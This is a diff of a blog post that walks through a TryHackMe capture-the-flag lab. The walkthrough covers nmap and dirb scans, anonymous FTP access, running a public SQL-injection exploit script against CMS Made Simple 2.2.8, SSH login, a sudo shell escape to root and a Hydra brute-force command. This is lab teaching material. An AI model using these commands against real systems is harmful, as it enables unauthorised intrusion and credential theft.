@@ -1,10 +1,10 @@
 ---
 title: Simple CTF
 categories: [Try-Hack-Me] # Up to two elements only
-tags: [tryhackme, easy, simple ctf, ctf, sqli, ftp, dirb]     # TAG names should always be lowercase, infinate number of elements
+tags: [tryhackme, easy, simple ctf, ctf, sqli, ftp, dirb]     # TAG names should always be lowercase, infinite number of elements
 image: /assets/img/posts/Simple_ctf/Simple_ctf.webp    # If you want to add an image to the top of the post contents
 # toc: false    # table of content - overwrite global configuration from _config.yml
-# comments: flase       # overwrite global configuration from _config.yml
+# comments: false       # overwrite global configuration from _config.yml
 # pin: true     # pin one or more posts to the top of the home page
 excerpt_separator: <!--exc-->
 permalink: /:categories/:year/:month/:day/:title:output_ext
@@ -22,16 +22,14 @@ In this post, we'll try to root [Simple-CTF](https://tryhackme.com/room/easyctf)
 # Prerequisites
 ## Kali Linux / Parrot Security OS 
 The virtual machine we'll use to source the attack vectors against the Simple-CTF machine. These Linux distribution has all required tools pre-installed. Choose one of them.
-* Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox 
-from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
-* Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded 
-from [https://www.parrotsec.org/download/](https://www.parrotsec.org/download/)
+* Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
+* Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded from [Parrot Security](https://www.parrotsec.org/download/)
 
 ## TryHackMe account
-Signup or login to [TryHackMe](https://tryhackme.com/) and deploy the machine.
+Signup or login to [TryHackMe](https://tryhackme.com/), deploy the [machine](https://tryhackme.com/room/easyctf) and give it a couple of minutes to boot.
 
 ## Dedicated Directory
-We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir`  and `cd` (change directory) into it:
+We need to create a dedicated directory in our home directory `~` for our findings. We'll use `mkdir` to create the directory and `cd` to change into it:
 
 ```console
 $ mkdir ~/tryhackme/simple_ctf
@@ -39,7 +37,8 @@ $ cd ~/tryhackme/simple_ctf/
 ```
 
 ## Add IP to hosts file [OPTIONAL]
-For better readability and as I don't want to try and remember the target'd IP, I'll add the machine's IP to my local `/etc/hosts` file:
+For better readability we'll add the target IP to our local `/etc/hosts` file.
+Please note this command requires sudo privileges. 
 
 ```console
 $ sudo nano /etc/hosts
@@ -55,7 +54,12 @@ Now we can use the '**simple.ctf**' hostname instead of the IP in all the comman
 
 # Scanning
 ## nmap
-We'll start by scanning all ports:
+We'll start with scanning the target for open ports using [nmap](https://nmap.org/). The command we'll use is `sudo nmap -sV -T4 -p- -O -oN nmap simple.ctf` which is a full TCP-SYN scan to scan all ports on the target. Let's break it down:
+* `-sV` determine service/version info
+* `-T4` for faster execution
+* `-p-` scan all ports
+* `-O` identify Operating System
+* `-oN` output to file, in our case it's called nmap
 
 ```console
 $ sudo nmap -sV -p- -T4 -O -oN nmap simple.ctf
@@ -76,8 +80,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 193.13 seconds
 ```
 
-## ftp
-Personally, if a scan finds a listening FTP service, I ALWAYS try to login using *anonymous* user with empty paswword. Let's do that.
+## FTP
+Personally, if a scan finds a listening FTP service, I ALWAYS try to login using *anonymous* user with empty password. Let's do that.
 
 ```console
 $ ftp simple.ctf
@@ -87,21 +91,20 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ```
 
-Nice! If we use `ls -la` command to list all files in the directory we find an intresting file - `ForMitch.txt`. using `get ForMitch.txt` we can pull that file to our local machine and read it:
+Nice! we're able to login. In order to list all files in the current directory, we use `ls -la` commandand find an interesting file - `ForMitch.txt`. Using `get ForMitch.txt` command we pull that file to our local machine and read it. It's content:
 
 ```
-Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+Dammit man... you're the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
 ```
 
-Looks lile we have two potential usernames:
+Looks like we have two potential usernames:
 1. Mitch / mitch
 2. system / root
 
 
 ## Website
 Using Firefox we can check the website on port 80. It looks like a simple Apache default page. Nothing in website headers as well.
-
-We'll run a directory scan using dirb
+We'll run a directory scan using **dirb** to try and find interesting URLs
 
 ```console
 $ dirb http://simple.ctf  
@@ -131,14 +134,12 @@ GENERATED WORDS: 4612
 ```
 
 dirb found a Simple CMS on `/simple` path. Let's investigate it using Firefox.
-The CMS footer is:
+**The CMS footer is:**
 
 > Copyright 2004 - 2021 - CMS Made Simple
 > This site is powered by CMS Made Simple version 2.2.8
 
-Quick search in [exploit-db](https://www.exploit-db.com/exploits/46635) reveals the CMS version is **vulnerable to SQLi**.
-(You may also use `searchsploit simple 2.2.8` to find that exploit)
-
+Quick search in [exploit-db](https://www.exploit-db.com/exploits/46635) reveals the CMS version is **vulnerable to SQLi** (You may also use `searchsploit simple 2.2.8` to find that exploit).
 We'll download the Python file and run it with `-h` flag to see what arguments we need to provide the script (same can be done if you know your way with Python code but I assume no prior knowledge).
 In case you encounter any errors regarding missing packages, use `pip` to install it. Here's a quick [intro to pip](https://docs.python.org/3/installing/index.html#basic-usage)
 
@@ -161,25 +162,25 @@ OK, so our flags are:
 
 Keep in mind Seclists in not pre-installed in Kali and can be downloaded using `sudo apt install seclists`
 
-This means our full command is:
+This means the complete command is:
 `python 46635.py --url http://simple.ctf/simple --crack --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt`. 
 
-The script will run on a dictionary of charectes, trying to find the right one in each place by injecting a special payload. The final output consists of the salt, username, email, hashed password and clear text password:
+The script will run on a dictionary of character, trying to find the right one in each place by injecting a special payload. The final output consists of the salt, username, email, hashed password and clear text password:
 ```console
-[+] Salt for password found: [REDUCTED]
-[+] Username found: [REDUCTED]
-[+] Email found: [REDUCTED]
-[+] Password found: [REDUCTED]
-[+] Password cracked: [REDUCTED]
+[+] Salt for password found: [REDACTED]
+[+] Username found: [REDACTED]
+[+] Email found: [REDACTED]
+[+] Password found: [REDACTED]
+[+] Password cracked: [REDACTED]
 ```
 
 
 # Gaining Access
 ## SSH
-Now that we have `username:password` commbination we can try to use and login to SSH (remember the FTP note? it stated the combination is the same):
+Now that we have `username:password` combination we can use it to login to SSH (remember the FTP note? it stated **the combination is the same**):
 
 ```
-$ ssh mitch@simple.ctf -p2222                                                                                                                     130 ⨯
+$ ssh mitch@simple.ctf -p2222
 The authenticity of host '[simple.ctf]:2222 ([simple.ctf]:2222)' can't be established.
 ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -187,24 +188,16 @@ Warning: Permanently added '[simple.ctf]:2222' (ECDSA) to the list of known host
 mitch@simple.ctf's password: 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-0 packages can be updated.
-0 updates are security updates.
-
 Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
-$ 
 ```
 
-Success. We now have an active shell. if we list files in that directory using `ls -la`,  we can find the **user flag**.
+**Success!** We were able to login and npw have an active shell. If we list files in that directory using `ls -la`,  we can find the **user flag**.
 
 Using `ls /home` we can list users in the system. This will reveal there's another user on the machine.
 
 
 # Privilege Escalation
-Using `sudo -l` command we can test our user permissions to run services / files with sudo privileges 
+Using `sudo -l` command we can test our user permissions to run services and files with sudo privileges 
 
 Note:
 : Links to further reading about `sudo -l` can be found at the Summary
@@ -212,12 +205,12 @@ Note:
 ```
 $ sudo -l          
 User mitch may run the following commands on Machine:
-    (root) NOPASSWD: /usr/bin/[REDUCTED]
+    (root) NOPASSWD: /usr/bin/[REDACTED]
 ```
 
 We can use that service to try and spawn a shell with sudo privileges. We first need to lunch the service as `sudo` and try to exit it back to shell. 
-`sudo /usr/bin/[REDUCTED]`
-Now, once we're in that app we can exit back to shell using `:shell` input, but now as *root*.
+`sudo /usr/bin/[REDACTED]`
+Now, once we're in that application we can exit back to shell using `:shell` input, but now the shell is *root* shell.
 
 Note:
 : Links to further reading how to spawn a TTY Shell can be found at the Summary
@@ -229,7 +222,7 @@ $ root@Machine:~# cd /root/
 $ root@Machine:/root# ls 
 root.txt
 $ root@Machine:/root# cat root.txt 
-[REDUCTED]
+[REDACTED]
 ```
 
 
@@ -238,33 +231,9 @@ $ root@Machine:/root# cat root.txt
 The website's *robots.txt* file contains the following:
 
 ```
-#
-# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
-#
-#   This file tells search engines not to index your CUPS server.
-#
-#   Copyright 1993-2003 by Easy Software Products.
-#
-#   These coded instructions, statements, and computer programs are the
-#   property of Easy Software Products and are protected by Federal
-#   copyright law.  Distribution and use rights are outlined in the file
-#   "LICENSE.txt" which should have been included with this file.  If this
-#   file is missing or damaged please contact Easy Software Products
-#   at:
-#
-#       Attn: CUPS Licensing Information
-#       Easy Software Products
-#       44141 Airport View Drive, Suite 204
-#       Hollywood, Maryland 20636-3111 USA
-#
-#       Voice: (301) 373-9600
-#       EMail: cups-info@cups.org
-#         WWW: http://www.cups.org
-#
-
+...
 User-agent: *
 Disallow: /
-
 
 Disallow: /openemr-5_0_1_3 
 #
@@ -272,18 +241,17 @@ Disallow: /openemr-5_0_1_3
 #
 ```
 
-I was positive *mike* is our user and tried looking for more details in the Simple CMS.
-Same for the */openemr-5_0_1_3* path, which was not available when I tested. Wasted some time Googling this as well.
+*mike* might be a user in Simple CMS and the */openemr-5_0_1_3* might be a URL path.
 
 ## hydra / brute-force
-I also tried to Brute-Force *mike*s password on SSH service using Hydra.
+Brute-Force *mike*s password on SSH service using Hydra.
 `hydra -l system -P /usr/share/wordlists/rockyou.txt ssh://simple.ctf:2222 -t 4`
 
-## Insuffucient Scanning
+## Insufficient Scanning
 Nikto wasn't able to find the Simple CMS and sent me to a goos chase all confused.
 
 
 # Summary
 ## Reading Materials
 * [How to spawn a TTY Shell](https://netsec.ws/?p=337)
-* *sudo -l* - I see this technice used in many CTFs, It's simple to run and easy to understnad. Make sure you feel comfortable with it. [READ](https://www.explainshell.com/explain?cmd=sudo+-l), [READ2](https://medium.com/better-programming/becoming-root-through-misconfigured-sudo-7b68e731d1f5)
+* *sudo -l* - I see this technique used in many CTFs, It's simple to run and easy to understand. Make sure you feel comfortable with it. [READ](https://www.explainshell.com/explain?cmd=sudo+-l), [READ2](https://medium.com/better-programming/becoming-root-through-misconfigured-sudo-7b68e731d1f5)
